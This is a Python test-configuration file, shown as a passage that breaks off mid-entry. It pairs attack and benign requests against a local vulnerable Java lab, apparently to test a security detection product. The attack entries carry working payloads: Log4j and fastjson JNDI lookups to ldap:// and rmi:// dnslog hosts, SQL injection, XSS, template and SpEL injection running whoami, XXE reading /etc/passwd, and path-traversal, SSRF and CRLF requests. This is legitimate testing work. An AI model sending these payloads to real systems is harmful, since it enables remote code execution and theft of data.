import os

host = os.environ.get('HOST', '192.168.0.9')

# 定义请求的配置
requests_config = {
    'log4j2_attack': {
        'name': 'Log4j2 远程代码执行漏洞（CVE-2021-44228）',
        'method': 'POST',
        'url': 'http://{}:9998/log4j2'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'name=${jndi:ldap://sectest-log4j2.dnslog.cn/a}',
        'type': 'attack'
    },
    'log4j2_normal': {
        'method': 'POST',
        'url': 'http://{}:9998/log4j2'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'name=1',
        'name': 'Log4j2 远程代码执行漏洞（CVE-2021-44228）',
        'type': 'normal',
    },
    'fastjson1_2_24_attack': {
        'method': 'POST',
        'url': 'http://{}:9999/fastjson1.2.24-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://fastjson-test.dnslog.cn","autoCommit":true}};',
        'name': 'fastjson-1.2.24反序列漏洞',
        'type': 'attack',
    },
    'fastjson_1_2_24_normal': {
        'method': 'POST',
        'url': 'http://{}:9999/fastjson1.2.24-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.24反序列漏洞',
        'type': 'normal',
    },

    'fastjson1_2_25_attack': {
        'method': 'POST',
        'url': 'http://{}:9987/fastjson1.2.25-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://fastjson125-dnslog.cn","autoCommit":true}}',
        'name': 'fastjson-1.2.25-1.2.47反序列漏洞-不需要AutoTypeSupport-通杀',
        'type': 'attack',
    },
    'fastjson1_2_25_normal': {
        'method': 'POST',
        'url': 'http://{}:9987/fastjson1.2.25-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.25-1.2.41反序列漏洞-disableAutoTypeSupport',
        'type': 'normal',
    },

    'fastjson1_2_41_attack': {
        'method': 'POST',
        'url': 'http://{}:9987/fastjson1.2.41-process-setAutoTypeSupport'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://fastjson125-141-setAutoTypeSupport-dnslog.cn","autoCommit":true}',
        'name': 'fastjson-1.2.25-1.2.41反序列漏洞-setAutoTypeSupport',
        'type': 'attack',
    },
    'fastjson1_2_41_normal': {
        'method': 'POST',
        'url': 'http://{}:9987/fastjson1.2.41-process-setAutoTypeSupport'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.25-1.2.41反序列漏洞-setAutoTypeSupport',
        'type': 'normal',
    },

    'fastjson1_2_42_attack': {
        'method': 'POST',
        'url': 'http://{}:9986/fastjson1.2.42-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://fastjson1_2_42_attack.dnslog.cn/Exploit", "autoCommit":true}',
        'name': 'fastjson-1.2.42反序列漏洞',
        'type': 'attack',
    },
    'fastjson1_2_42_normal': {
        'method': 'POST',
        'url': 'http://{}:9986/fastjson1.2.42-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.42反序列漏洞',
        'type': 'normal',
    },

    'fastjson1_2_43_attack': {
        'method': 'POST',
        'url': 'http://{}:9985/fastjson1.2.43-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://fastjson1_2_43_attack.dnslog.cn/Exploit","autoCommit":true]}',
        'name': 'fastjson-1.2.43反序列漏洞',
        'type': 'attack',
    },
    'fastjson1_2_43_normal': {
        'method': 'POST',
        'url': 'http://{}:9985/fastjson1.2.43-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.43反序列漏洞',
        'type': 'normal',
    },

    'fastjson1_2_45_attack': {
        'method': 'POST',
        'url': 'http://{}:9984/fastjson1.2.45-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://fastjson1.2.45-process.dnslog.cn/Exploit"}}',
        'name': 'fastjson-1.2.45反序列漏洞',
        'type': 'attack',
    },
    'fastjson1_2_45_normal': {
        'method': 'POST',
        'url': 'http://{}:9984/fastjson1.2.45-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.45反序列漏洞',
        'type': 'normal',
    },

    'fastjson1_2_59_attack_1': {
        'method': 'POST',
        'url': 'http://{}:9983/fastjson1.2.59-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"rmi://fastjson1.2.59-process.dnslog.cn/Exploit"}',
        'name': 'fastjson-1.2.59反序列漏洞(1.2.5 <= 1.2.59)-payload1',
        'type': 'attack',
    },
    'fastjson1_2_59_attack_2': {
        'method': 'POST',
        'url': 'http://{}:9983/fastjson1.2.59-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"rmi://fastjson1.2.59-process.dnslog.cn/Exploit"}',
        'name': 'fastjson-1.2.59反序列漏洞(1.2.5 <= 1.2.59)-payload2',
        'type': 'attack',
    },
    'fastjson1_2_59_normal': {
        'method': 'POST',
        'url': 'http://{}:9983/fastjson1.2.59-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.59反序列漏洞(1.2.5 <= 1.2.59)',
        'type': 'normal',
    },


    'fastjson1_2_60_attack_1': {
        'method': 'POST',
        'url': 'http://{}:9982/fastjson1.2.60-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://fastjson1.2.60-process.dnslog.cn/ExportObject"}',
        'name': 'fastjson-1.2.60反序列漏洞(1.2.5 <= 1.2.60)-payload1',
        'type': 'attack',
    },
    'fastjson1_2_60_attack_2': {
        'method': 'POST',
        'url': 'http://{}:9982/fastjson1.2.60-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"rmi://fastjson1.2.60-process.dnslog.cn/ExportObject"}',
        'name': 'fastjson-1.2.60反序列漏洞(1.2.5 <= 1.2.60)-payload2',
        'type': 'attack',
    },
    'fastjson1_2_60_normal': {
        'method': 'POST',
        'url': 'http://{}:9982/fastjson1.2.60-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.60反序列漏洞(1.2.5 <= 1.2.60)',
        'type': 'normal',
    },


    'fastjson1_2_61_attack_1': {
        'method': 'POST',
        'url': 'http://{}:9981/fastjson1.2.61-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"rmi://fastjson1.2.61-process.dnslog.cn/Exploit"}',
        'name': 'fastjson-1.2.61反序列漏洞-payload1',
        'type': 'attack',
    },
    'fastjson1_2_61_attack_2': {
        'method': 'POST',
        'url': 'http://{}:9981/fastjson1.2.61-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://fastjson1.2.61-process.dnslog.cn/Exploit","Object":"a"}',
        'name': 'fastjson-1.2.61反序列漏洞-payload2',
        'type': 'attack',
    },
    'fastjson1_2_61_normal': {
        'method': 'POST',
        'url': 'http://{}:9981/fastjson1.2.61-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.61反序列漏洞',
        'type': 'normal',
    },

    'fastjson1_2_62_attack_1': {
        'method': 'POST',
        'url': 'http://{}:9980/fastjson1.2.62-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://fastjson1.2.62-process.dnslog.cn/Exploit"}',
        'name': 'fastjson-1.2.62反序列漏洞-payload1',
        'type': 'attack',
    },

    'fastjson1_2_62_attack_2': {
        'method': 'POST',
        'url': 'http://{}:9980/fastjson1.2.62-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://fastjson1.2.62-process.dnslog.cn/Exploit"}}',
        'name': 'fastjson-1.2.62反序列漏洞-payload2',
        'type': 'attack',
    },


    'fastjson1_2_62_normal': {
        'method': 'POST',
        'url': 'http://{}:9980/fastjson1.2.62-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.62反序列漏洞',
        'type': 'normal',
    },

    'fastjson1_2_66_attack_1': {
        'method': 'POST',
        'url': 'http://{}:9979/fastjson1.2.66-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"com.caucho.config.types.ResourceRef","LookupName":"rmi://fastjson1.2.66-process.dnslog.cn/Exploit"}',
        'name': 'fastjson-1.2.66反序列漏洞-payload1',
        'type': 'attack',
    },

    'fastjson1_2_66_attack_2': {
        'method': 'POST',
        'url': 'http://{}:9979/fastjson1.2.66-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://fastjson1.2.66-process.dnslog.cn/Exploit"}',
        'name': 'fastjson-1.2.66反序列漏洞-payload2',
        'type': 'attack',
    },

    'fastjson1_2_66_attack_3': {
        'method': 'POST',
        'url': 'http://{}:9979/fastjson1.2.66-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://fastjson1.2.66-process.dnslog.cn/Exploit"}',
        'name': 'fastjson-1.2.66反序列漏洞-payload3',
        'type': 'attack',
    },

    'fastjson1_2_66_attack_4': {
        'method': 'POST',
        'url': 'http://{}:9979/fastjson1.2.66-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://fastjson1.2.66-process.dnslog.cn/Exploit"}',
        'name': 'fastjson-1.2.66反序列漏洞-payload4',
        'type': 'attack',
    },

    'fastjson1_2_66_attack_5': {
        'method': 'POST',
        'url': 'http://{}:9979/fastjson1.2.66-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://fastjson1.2.66-process.dnslog.cn/Exploit"}',
        'name': 'fastjson-1.2.66反序列漏洞-payload5',
        'type': 'attack',
    },

    'fastjson1_2_66_attack_6': {
        'method': 'POST',
        'url': 'http://{}:9979/fastjson1.2.66-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://fastjson1.2.66-process.dnslog.cn/Exploit"], "Realms":[""]}',
        'name': 'fastjson-1.2.66反序列漏洞-payload6',
        'type': 'attack',
    },

    'fastjson1_2_66_normal': {
        'method': 'POST',
        'url': 'http://{}:9979/fastjson1.2.66-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.66反序列漏洞',
        'type': 'normal',
    },

    'fastjson1_2_67_attack_1': {
        'method': 'POST',
        'url': 'http://{}:9978/fastjson1.2.67-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://fastjson1.2.67-process.dnslog.cn/Exploit"], "tm": {"$ref":"$.tm"}}',
        'name': 'fastjson-1.2.67反序列漏洞-payload1',
        'type': 'attack',
    },

    'fastjson1_2_67_attack_2': {
        'method': 'POST',
        'url': 'http://{}:9978/fastjson1.2.67-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://fastjson1.2.67-process.dnslog.cn/Exploit","instance":{"$ref":"$.instance"}}',
        'name': 'fastjson-1.2.67反序列漏洞-payload2',
        'type': 'attack',
    },

    'fastjson1_2_67_normal': {
        'method': 'POST',
        'url': 'http://{}:9978/fastjson1.2.67-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.67反序列漏洞',
        'type': 'normal',
    },

    'fastjson1_2_68_attack_1': {
        'method': 'POST',
        'url': 'http://{}:9977/fastjson1.2.68-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://fastjson1.2.68-process.dnslog.cn/Calc"}',
        'name': 'fastjson-1.2.68反序列漏洞-payload1',
        'type': 'attack',
    },

    'fastjson1_2_68_attack_2': {
        'method': 'POST',
        'url': 'http://{}:9977/fastjson1.2.68-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://fastjson1.2.68-process.dnslog.cn/Calc"}',
        'name': 'fastjson-1.2.68反序列漏洞-payload2',
        'type': 'attack',
    },

    'fastjson1_2_68_normal': {
        'method': 'POST',
        'url': 'http://{}:9977/fastjson1.2.68-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.68反序列漏洞',
        'type': 'normal',
    },

    'fastjson1_2_80_attack': {
        'method': 'POST',
        'url': 'http://{}:9976/fastjson1.2.80-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"@type": "java.lang.Exception","@type": "myapp.Poc","name": "ping fastjson1.2.80-process.dnslog.cn"}',
        'name': 'fastjson-1.2.80反序列漏洞',
        'type': 'attack',
    },

    'fastjson1_2_80_normal': {
        'method': 'POST',
        'url': 'http://{}:9976/fastjson1.2.80-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.80反序列漏洞',
        'type': 'normal',
    },

    'fastjson1_2_83_normal': {
        'method': 'POST',
        'url': 'http://{}:9975/fastjson1.2.83-process'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"name":"123","email":"123@123","age":"123"}',
        'name': 'fastjson-1.2.83-反序列漏洞',
        'type': 'normal',
    },





    'druid_unauthorized': {
        'method': 'GET',
        'url': 'http://{}:9997/druid'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'druid未授权漏洞',
        'type': 'attack',
    },
    'druid_authorized': {
        'method': 'GET',
        'url': 'http://{}:9996/druid'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'druid未授权漏洞',
        'type': 'repair',
    },

'druid_sqlwall': {
        'method': 'GET',
        'url': 'http://{}:9997/druid_sql?id=1'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'druid-SQL防火墙',
        'type': 'mistake',
    },

    'actuator2_unauthorized': {
        'method': 'GET',
        'url': 'http://{}:9995/actuator'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SpringBoot Actuator未授权访问漏洞2.X',
        'type': 'attack',
    },
    'actuator2_authorized': {
        'method': 'GET',
        'url': 'http://{}:9994/actuator'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SpringBoot Actuator未授权访问漏洞2.X',
        'type': 'repair',
    },
    'actuator1_unauthorized': {
        'method': 'GET',
        'url': 'http://{}:9993/trace'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SpringBoot Actuator未授权访问漏洞1.X',
        'type': 'attack',
    },
    'actuator1_authorized': {
        'method': 'GET',
        'url': 'http://{}:9992/trace'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SpringBoot Actuator未授权访问漏洞1.X',
        'type': 'repair',
    },
    'sql_injection_id_attack': {
        'method': 'GET',
        'url': "http://{}:9991/users/1'/".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-数字',
        'type': 'attack',
    },
    'sql_injection_ids_attack': {
        'method': 'GET',
        'url': "http://{}:9991/users/ids/?ids=1,2,3'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-数组',
        'type': 'attack',
    },
    'sql_injection_like_attack': {
        'method': 'GET',
        'url': "http://{}:9991/users/name?name=A'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-like模糊匹配',
        'type': 'attack',
    },
    'sql_injection_strs_attack': {
        'method': 'GET',
        'url': "http://{}:9991/users/names?names=Alice&names=Bob'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-字符串数组',
        'type': 'attack',
    },
    'sql_injection_orderby_attack': {
        'method': 'GET',
        'url': "http://{}:9991/users/sort?orderByColumn=name&orderByDirection=asc'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-排序',
        'type': 'attack',
    },

    'sql_injection_Optional_attack': {
        'method': 'GET',
        'url': "http://{}:9991/users/findByOptionalUsername?username=test'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-Optional<String>',
        'type': 'attack',
    },

    'sql_injection_Object_attack': {
        'method': 'POST',
        'url': "http://{}:9991/users/get_name_object".format(host),
        'headers': {'Content-Type': 'application/json'},
        'data':'{"name":"test\'"}',
        'name': 'SQL注入-Object<String>',
        'type': 'attack',
    },

    'sql_injection_Annotation_attack': {
        'method': 'GET',
        'url': "http://{}:9991/users/by-username?name=test'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-MyBatis注解方式',
        'type': 'attack',
    },

    'sql_injection_lombok_attack': {
        'method': 'POST',
        'url': "http://{}:9991/users/lombok".format(host),
        'headers': {'Content-Type': 'application/json'},
        'data':'{"name":"test\'"}',
        'name': 'SQL注入-lombok',
        'type': 'attack',
    },

    'sql_injection_hsqldb_attack': {
        'method': 'GET',
        'url': "http://{}:9989/hsqldb?username=1'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-hsqldb',
        'type': 'attack',
    },

    'sql_injection_Hibernate_attack': {
        'method': 'GET',
        'url': "http://{}:9988/Hibernate_injection?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'='".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-Hibernate',
        'type': 'attack',
    },



    'sql_injection_hsqldb_normal': {
        'method': 'GET',
        'url': "http://{}:9989/hsqldb?username=1'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-hsqldb',
        'type': 'normal',
    },

    'sql_injection_lombok_normal': {
        'method': 'POST',
        'url': "http://{}:9991/users/lombok".format(host),
        'headers': {'Content-Type': 'application/json'},
        'data':'{"name":"test"}',
        'name': 'SQL注入-lombok',
        'type': 'normal',
    },

    'sql_injection_longlist_normal': {
        'method': 'POST',
        'url': "http://{}:9991/users/findByIds".format(host),
        'headers': {'Content-Type': 'application/json'},
        'data':'[1,2,3]',
        'name': 'SQL注入-longlist',
        'type': 'normal',
    },

    'sql_injection_longint_normal': {
        'method': 'POST',
        'url': "http://{}:9991/users/getUserByUId".format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '{"id":"1"}',
        'name': 'SQL注入-longint',
        'type': 'normal',
    },

    'sql_injection_jpaone_normal': {
        'method': 'GET',
        'url': "http://{}:9991/users/jpaone?name=test".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-jpaone',
        'type': 'normal',
    },

    'sql_injection_jpawithAnnotations_normal': {
        'method': 'GET',
        'url': "http://{}:9991/users/jpawithAnnotations?name=test".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-jpawithAnnotations',
        'type': 'normal',
    },

    'sql_injection_Annotation_normal': {
        'method': 'GET',
        'url': "http://{}:9991/users/by-username?name=test".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-MyBatis注解方式',
        'type': 'normal',
    },

    'sql_injection_id_normal': {
        'method': 'GET',
        'url': 'http://{}:9991/users/1/'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-数字',
        'type': 'normal',
    },
    'sql_injection_ids_normal': {
        'method': 'GET',
        'url': 'http://{}:9991/users/ids/?ids=1,2,3'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-数组',
        'type': 'normal',
    },
    'sql_injection_like_normal': {
        'method': 'GET',
        'url': 'http://{}:9991/users/name?name=A'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-like模糊匹配',
        'type': 'normal',
    },
    'sql_injection_strs_normal': {
        'method': 'GET',
        'url': 'http://{}:9991/users/names?names=Alice&names=Bob'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-字符串数组',
        'type': 'normal',
    },
    'sql_injection_orderby_normal': {
        'method': 'GET',
        'url': 'http://{}:9991/users/sort?orderByColumn=name&orderByDirection=asc'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-排序',
        'type': 'normal',
    },

    'sql_injection_Optional_normal': {
        'method': 'GET',
        'url': "http://{}:9991/users/findByOptionalUsername?username=test".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-Optional<String>',
        'type': 'normal',
    },

    'sql_injection_Object_normal': {
        'method': 'POST',
        'url': "http://{}:9991/users/get_name_object".format(host),
        'headers': {'Content-Type': 'application/json'},
        'data':'{"name":"test"}',
        'name': 'SQL注入-Object<String>',
        'type': 'normal',
    },



    'xss_reflect_attack': {
        'method': 'GET',
        'url': 'http://{}:9991/xss_reflect?name=<script>alert(123)</script>'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '反射型XSS漏洞',
        'type': 'attack',
    },
    'xss_reflect_normal': {
        'method': 'GET',
        'url': 'http://{}:9991/xss_reflect?name=1'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '反射型XSS漏洞',
        'type': 'normal',
    },
    'xss_storage_attack': {
        'method': 'GET',
        'url': 'http://{}:9991/xss_storage?name=<script>alert(123)</script>'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '存储型XSS漏洞',
        'type': 'attack',
    },
    'xss_dom_attack': {
        'method': 'POST',
        'url': 'http://{}:9991/xss_dom'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'DOM XSS漏洞',
        'data': 'name=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E',
        'type': 'attack',
    },
    'xss_dom_normal': {
        'method': 'POST',
        'url': 'http://{}:9991/xss_dom'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'DOM XSS漏洞',
        'data': 'name=test',
        'type': 'normal',
    },

    'file_upload_attack': {
        'method': 'POST',
        'url': 'http://{}:9991/file_upload'.format(host),
        'headers': {},
        'parm': 'file',
        'file': 'test.txt',
        'name': '任意文件上传漏洞',
        'type': 'attack',
    },

    'file_read_attack': {
        'method': 'GET',
        'url': 'http://{}:9991/file_read?filePath=/etc/passwd'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '任意文件读取漏洞',
        'type': 'attack',
    },

    'file_write_attack': {
        'method': 'GET',
        'url': 'http://{}:9991/file_write?fileName=test.txt&data=test'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '任意文件写入漏洞',
        'type': 'attack',
    },

    'file_download_attack': {
        'method': 'GET',
        'url': 'http://{}:9991/file_download?fileName=../pom.xml'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '任意文件下载漏洞',
        'type': 'attack',
    },
    'file_download_normal': {
        'method': 'GET',
        'url': 'http://{}:9991/file_download?fileName=test.txt'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '任意文件下载漏洞',
        'type': 'normal',
    },

    'file_delete_attack': {
        'method': 'GET',
        'url': 'http://{}:9991/file_delete?fileName=test.txt'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '任意文件删除漏洞',
        'type': 'attack',
    },

    'runtime_command_execute': {
        'method': 'GET',
        'url': 'http://{}:9991/runtime_command_execute?command=whoami'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '命令执行漏洞-runtime',
        'type': 'attack',
    },

    'process_builder_command_execute': {
        'method': 'GET',
        'url': 'http://{}:9991/process_builder_command_execute?command=whoami'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '命令执行漏洞-ProcessBuilder',
        'type': 'attack',
    },

    'crlf_injection_attack': {
        'method': 'GET',
        'url': 'http://{}:9991/crlf_injection?name=%0D%0ASet-Cookie: sessionid=123456'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'CRLF注入',
        'type': 'attack',
    },

    'spel_expression_attack': {
        'method': 'GET',
        'url': "http://{}:9991/spel_expression?input=T(java.lang.Runtime).getRuntime().exec('whoami')".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SPEL表达式攻击',
        'type': 'attack',
    },

    'ssrf_openStream_attack': {
        'method': 'GET',
        'url': "http://{}:9991/ssrf_openStream?url=https://www.baidu.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-openStream',
        'type': 'attack',
    },

    'ssrf_openConnection_attack': {
        'method': 'GET',
        'url': "http://{}:9991/ssrf_openConnection?url=http://www.baidu.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-openConnection',
        'type': 'attack',
    },

    'ssrf_requestGet_attack': {
        'method': 'GET',
        'url': "http://{}:9991/ssrf_requestGet?url=https://www.baidu.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-requestGet',
        'type': 'attack',
    },

    'ssrf_okhttp_attack': {
        'method': 'GET',
        'url': "http://{}:9991/ssrf_okhttp?url=https://www.baidu.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-okhttp',
        'type': 'attack',
    },

    'ssrf_defaultHttpClient_attack': {
        'method': 'GET',
        'url': "http://{}:9991/ssrf_defaultHttpClient?url=https://www.baidu.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-defaultHttpClient',
        'type': 'attack',
    },



    'ssti_velocity_attack': {
        'method': 'GET',
        'url': """http://{}:9991/ssti_velocity?content=%23set (%24exp %3d "exp")%3b%24exp.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSTI攻击-velocity',
        'type': 'attack',
    },
    'ssti_freemarker_attack': {
        'method': 'GET',
        'url': """http://{}:9991/ssti_freemarker?templateContent=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22bash%20-c%20whoami%22%29%20%7D""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSTI攻击-freemarker',
        'type': 'attack',
    },

    'xxe_saxparserfactory_attack': {
        'method': 'POST',
        'url': """http://{}:9991/xxe_saxparserfactory""".format(
            host),
        'data': """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'XXE-saxparserfactory',
        'type': 'attack',
    },
    'xxe_xmlreaderfactory_attack': {
        'method': 'POST',
        'url': """http://{}:9991/xxe_xmlreaderfactory""".format(
            host),
        'data': """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'XXE-xmlreaderfactory',
        'type': 'attack',
    },

    'xxe_saxbuilder_attack': {
        'method': 'POST',
        'url': """http://{}:9991/xxe_saxbuilder""".format(
            host),
        'data': """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'XXE-saxbuilder',
        'type': 'attack',
    },
    'xxe_saxreader_attack': {
        'method': 'POST',
        'url': """http://{}:9991/xxe_saxreader""".format(
            host),
